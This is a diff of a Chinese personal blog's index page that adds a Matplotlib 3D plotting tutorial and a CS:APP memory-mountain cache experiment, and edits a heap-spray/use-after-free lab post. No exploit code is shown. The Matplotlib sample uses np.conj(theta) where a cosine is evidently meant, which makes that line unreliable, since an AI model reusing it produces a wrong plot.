@@ -145,18 +145,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -173,6 +173,363 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/11/04/Learning-Python/Matploitlib/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="czxvan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="czxvan's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | czxvan's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/11/04/Learning-Python/Matploitlib/" class="post-title-link" itemprop="url">Matploitlib</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-11-04 20:37:58 / 修改时间：20:41:31" itemprop="dateCreated datePublished" datetime="2023-11-04T20:37:58+08:00">2023-11-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Learning-Python/" itemprop="url" rel="index"><span itemprop="name">Learning-Python</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <span id="more"></span>
+
+
+
+<p>示例代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入绘制三维的模块</span></span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">20</span>,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制三维曲线</span></span><br><span class="line">axl = fig.add_subplot(<span class="number">221</span>,projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">theta = np.linspace(-<span class="number">4</span>*np.pi, <span class="number">4</span>*np.pi, <span class="number">500</span>)</span><br><span class="line">z = np.linspace(-<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>)</span><br><span class="line">r = z**<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">x = r*np.sin(theta)</span><br><span class="line">y = r*np.conj(theta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法与绘制二维曲线图相同</span></span><br><span class="line">axl.plot(x,y,z)</span><br><span class="line">axl.set_xlabel(<span class="string">&#x27;x&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl.set_ylabel(<span class="string">&#x27;y&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl.set_zlabel(<span class="string">&#x27;z&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制三维散点图</span></span><br><span class="line">axl2 = fig.add_subplot(<span class="number">222</span>,projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = np.random.randn(<span class="number">500</span>)</span><br><span class="line">y = np.random.randn(<span class="number">500</span>)</span><br><span class="line">z = np.random.randn(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法与绘制二维曲线图相同</span></span><br><span class="line">axl2.scatter(x,y,z,c=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">axl2.set_xlabel(<span class="string">&#x27;x&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl2.set_ylabel(<span class="string">&#x27;y&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl2.set_zlabel(<span class="string">&#x27;z&#x27;</span>,fontsize=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制三维曲面图</span></span><br><span class="line">axl3 = fig.add_subplot(<span class="number">223</span>,projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">x = np.linspace(-<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>)</span><br><span class="line">y = np.linspace(-<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>)</span><br><span class="line">x,y = np.meshgrid(x,y)</span><br><span class="line">z = np.sqrt(x**<span class="number">2</span> + y**<span class="number">2</span>)</span><br><span class="line">axl3.plot_surface(x,y,z,cmap=plt.cm.winter)</span><br><span class="line">axl3.set_xlabel(<span class="string">&#x27;x&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl3.set_ylabel(<span class="string">&#x27;y&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line">axl3.set_zlabel(<span class="string">&#x27;z&#x27;</span>, fontsize=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制三维条形图</span></span><br><span class="line">axl4 = fig.add_subplot(<span class="number">224</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> np.arange(<span class="number">0</span>,<span class="number">40</span>,<span class="number">10</span>):</span><br><span class="line">    x = np.arange(<span class="number">20</span>)</span><br><span class="line">    y = np.random.randn(<span class="number">20</span>)</span><br><span class="line">    axl4.bar(x,y,zs=z,zdir=<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axl4.set_xlabel(<span class="string">&#x27;x&#x27;</span>,fontsize=<span class="number">15</span>)</span><br><span class="line">axl4.set_ylabel(<span class="string">&#x27;y&#x27;</span>,fontsize=<span class="number">15</span>)</span><br><span class="line">axl4.set_zlabel(<span class="string">&#x27;z&#x27;</span>,fontsize=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/11/04/Memory-Mountains/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="czxvan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="czxvan's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | czxvan's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/11/04/Memory-Mountains/" class="post-title-link" itemprop="url">Memory Mountains</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-11-04 19:54:07" itemprop="dateCreated datePublished" datetime="2023-11-04T19:54:07+08:00">2023-11-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-05 00:34:37" itemprop="dateModified" datetime="2023-11-05T00:34:37+08:00">2023-11-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/else/" itemprop="url" rel="index"><span itemprop="name">else</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Memory-Mountain实验。</p>
+<p>参考资料：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/students.html">CS:APP3e, Bryant and O’Hallaron (cmu.edu)</a></li>
+</ul>
+<h2 id="一、列出cache参数"><a href="#一、列出cache参数" class="headerlink" title="一、列出cache参数"></a>一、列出cache参数</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">lscpu</span></span><br><span class="line">...</span><br><span class="line">L1d cache:                       192 KiB</span><br><span class="line">L1i cache:                       192 KiB</span><br><span class="line">L2 cache:                        1.5 MiB</span><br><span class="line">L3 cache:                        9 MiB</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>本机共6个cpu（cpu0-5)。每个cpu目录下，都有它能够使用的cache的信息：</p>
+<p><img src="/../pic/memory-mountain/cpu0-cache-ls.png" alt="cpu0-cache-ls"></p>
+<p><img src="/../pic/memory-mountain/cpu0-index0-ls.png" alt="cpu0-index0-ls"></p>
+<p>下面以cpu0和cpu1为例，列出它们各自cache的信息。</p>
+<p>cpu0可以使用的四个缓存的各项参数如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>index0</th>
+<th>index1</th>
+<th>index2</th>
+<th>index3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>level</td>
+<td>1</td>
+<td>1</td>
+<td>2</td>
+<td>3</td>
+</tr>
+<tr>
+<td>type</td>
+<td>Data</td>
+<td>Instruction</td>
+<td>Unified</td>
+<td>Unified</td>
+</tr>
+<tr>
+<td>size</td>
+<td>32K</td>
+<td>32K</td>
+<td>256K</td>
+<td>9216K</td>
+</tr>
+<tr>
+<td>coherency_line_size</td>
+<td>64</td>
+<td>64</td>
+<td>64</td>
+<td>64</td>
+</tr>
+<tr>
+<td>number_of_sets</td>
+<td>64</td>
+<td>64</td>
+<td>1024</td>
+<td>12288</td>
+</tr>
+<tr>
+<td>physical_line_partition</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>shared_cpu_list</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0-5</td>
+</tr>
+<tr>
+<td>shared_cpu_map</td>
+<td>01</td>
+<td>01</td>
+<td>01</td>
+<td>3f</td>
+</tr>
+<tr>
+<td>ways_of_associativity</td>
+<td>8</td>
+<td>8</td>
+<td>4</td>
+<td>12</td>
+</tr>
+</tbody></table>
+<p>cpu1可以使用的四个缓存的各项参数如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>index0</th>
+<th>index1</th>
+<th>index2</th>
+<th>index3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>level</td>
+<td>1</td>
+<td>1</td>
+<td>2</td>
+<td>3</td>
+</tr>
+<tr>
+<td>type</td>
+<td>Data</td>
+<td>Instruction</td>
+<td>Unified</td>
+<td>Unified</td>
+</tr>
+<tr>
+<td>size</td>
+<td>32K</td>
+<td>32K</td>
+<td>256K</td>
+<td>9216K</td>
+</tr>
+<tr>
+<td>coherency_line_size</td>
+<td>64</td>
+<td>64</td>
+<td>64</td>
+<td>64</td>
+</tr>
+<tr>
+<td>number_of_sets</td>
+<td>64</td>
+<td>64</td>
+<td>1024</td>
+<td>12288</td>
+</tr>
+<tr>
+<td>physical_line_partition</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>shared_cpu_list</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>0-5</td>
+</tr>
+<tr>
+<td>shared_cpu_map</td>
+<td>02</td>
+<td>02</td>
+<td>02</td>
+<td>3f</td>
+</tr>
+<tr>
+<td>ways_of_associativity</td>
+<td>8</td>
+<td>8</td>
+<td>4</td>
+<td>12</td>
+</tr>
+</tbody></table>
+<h3 id="二、绘制存储器山"><a href="#二、绘制存储器山" class="headerlink" title="二、绘制存储器山"></a>二、绘制存储器山</h3><p><img src="/../pic/memory-mountain/memory-mountain-2.png" alt="memory-mountain-2"></p>
+<p><img src="/../pic/memory-mountain/memory-mountain-3.png" alt="memory-mountain-3"></p>
+<p>首先运行mountain程序，并将输出结果重定向到<code>mountain.txt</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mountain &gt; mountain.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用python读取输出结果并绘制图像，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;SimHei&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_from_file</span>(<span class="params">path</span>):</span><br><span class="line">    z = []</span><br><span class="line">    y_ticklabels = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./mountain.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        x_ticklabels = lines[<span class="number">2</span>].strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">3</span>:]:</span><br><span class="line">            line = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">0</span>:</span><br><span class="line">                y_ticklabels.append(line[<span class="number">0</span>])</span><br><span class="line">            z.append([<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> line[<span class="number">1</span>:]])</span><br><span class="line">    <span class="keyword">return</span> np.array(z) , np.array(x_ticklabels), np.array(y_ticklabels)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个3D图形对象</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax1 = fig.add_subplot(<span class="number">121</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">ax2 = fig.add_subplot(<span class="number">122</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建网格数据</span></span><br><span class="line">x = np.arange(<span class="number">15</span>)</span><br><span class="line">y = np.arange(<span class="number">14</span>)</span><br><span class="line">x, y = np.meshgrid(x, y)</span><br><span class="line">z, x_ticklabels , y_ticklabels = read_from_file(<span class="string">&quot;./mountain.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制3D曲面图，应用颜色映射</span></span><br><span class="line">colormap = plt.get_cmap(<span class="string">&#x27;plasma&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ax <span class="keyword">in</span> [ax1, ax2]:</span><br><span class="line">    surf = ax.plot_surface(x, y, z, cmap=colormap)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置轴标签</span></span><br><span class="line">    ax.set_xlabel(<span class="string">&#x27;步长\n(x8 bytes)&#x27;</span>)</span><br><span class="line">    ax.set_ylabel(<span class="string">&#x27;大小(bytes)&#x27;</span>)</span><br><span class="line">    ax.set_zlabel(<span class="string">&#x27;读吞吐量(MB/s)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ax.set_xticks(<span class="built_in">range</span>(<span class="built_in">len</span>(x_ticklabels)))</span><br><span class="line">    ax.set_yticks(<span class="built_in">range</span>(<span class="built_in">len</span>(y_ticklabels)))</span><br><span class="line">    ax.set_xticklabels(x_ticklabels)</span><br><span class="line">    ax.set_yticklabels(y_ticklabels)</span><br><span class="line"></span><br><span class="line">ax2.view_init(azim=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># ax1.view_init(azim=-90)</span></span><br><span class="line"><span class="comment"># ax2.view_init(elev=90, azim=0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示图形</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、测试数据列表"><a href="#三、测试数据列表" class="headerlink" title="三、测试数据列表"></a>三、测试数据列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Clock frequency is approx. 2904.0 MHz</span><br><span class="line">Memory mountain (MB/sec)</span><br><span class="line">		s1		s2		s3		s4		s5		s6		s7		s8		s9		s10		s11		s12		s13		s14		s15	</span><br><span class="line">128m	17796	10321	7056	5149	4091	3472	2947	2579	2311	2107	1961	1816	1702	1622	1605	</span><br><span class="line">64m		18269	10471	7119	5137	4180	3492	2965	2617	2360	2161	2010	1874	1790	1659	1619	</span><br><span class="line">32m		18473	10803	7407	5383	4282	3653	3123	2727	2522	2320	2173	2033	1935	1833	1785	</span><br><span class="line">16m		18664	11309	8015	6391	5028	4348	3887	3384	3162	3049	2730	2719	2361	2619	2514	</span><br><span class="line">8m		23334	15252	11627	9366	7769	6600	5734	5283	5387	5436	5431	5417	4865	5070	5181	</span><br><span class="line">4m		32108	23975	19482	15685	13245	11416	10047	8906	8554	8300	8006	7752	7572	7403	7259	</span><br><span class="line">2m		32679	24999	20430	16263	13521	11481	10155	8957	8719	8396	8087	7803	7609	7422	7298	</span><br><span class="line">1024k	32602	24671	20300	16291	13646	11716	10301	9007	8708	8384	8090	7798	7574	7428	7316	</span><br><span class="line">512k	32584	24859	20540	16541	13854	11878	10483	9223	8959	8679	8442	8333	8237	8158	8240	</span><br><span class="line">256k	34448	28029	25647	22996	20533	18201	16064	14173	14305	14053	14115	14685	13959	14389	14288	</span><br><span class="line">128k	34831	28976	26846	23784	20530	17720	15774	13799	13400	13327	13176	12946	12802	12891	12650	</span><br><span class="line">64k		35434	30363	29479	26820	22311	19961	17284	14595	15157	14925	14525	14766	13929	16971	28321	</span><br><span class="line">32k		39849	37582	37625	37701	37023	36207	36250	35507	34772	36590	38266	36201	34197	31754	35832	</span><br><span class="line">16k		38872	37582	36710	36376	34976	38485	32987	36487	33241	34721	35155	33880	35525	29545	33381	</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、存储器山分析"><a href="#四、存储器山分析" class="headerlink" title="四、存储器山分析"></a>四、存储器山分析</h2><p>可以比较清晰的看出，存储器山分成了四层，分别对应三级缓存和主存。</p>
+<p>且前两道山脊分别对应着L1和L2单个缓存芯片的大小（32k和256k）：</p>
+<p><img src="/../pic/memory-mountain/memory-mountain-2-mark.png" alt="memory-mountain-3"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -210,9 +567,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-11-02 09:57:47 / 修改时间：23:41:00" itemprop="dateCreated datePublished" datetime="2023-11-02T09:57:47+08:00">2023-11-02</time>
+      <time title="创建时间：2023-11-02 09:57:47" itemprop="dateCreated datePublished" datetime="2023-11-02T09:57:47+08:00">2023-11-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-04 17:18:57" itemprop="dateModified" datetime="2023-11-04T17:18:57+08:00">2023-11-04</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -234,52 +597,20 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>参考资料：</p>
+          <p>堆喷射和UAF漏洞实验。</p>
+<p>Win10下，堆基址的随机化粒度比win7小，导致本实验暂时无法完成……</p>
+<p>参考资料：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-207103.htm">Exploitme5(heap spraying &amp; UAF)-外文翻译|kanxue.com</a></li>
 </ul>
-<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
-<li>Windows10 VisualStudio2022</li>
-<li>关闭&#x2F;sdl</li>
-<li>关闭警告&#x2F;W0（可选）</li>
-</ul>
-<h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span 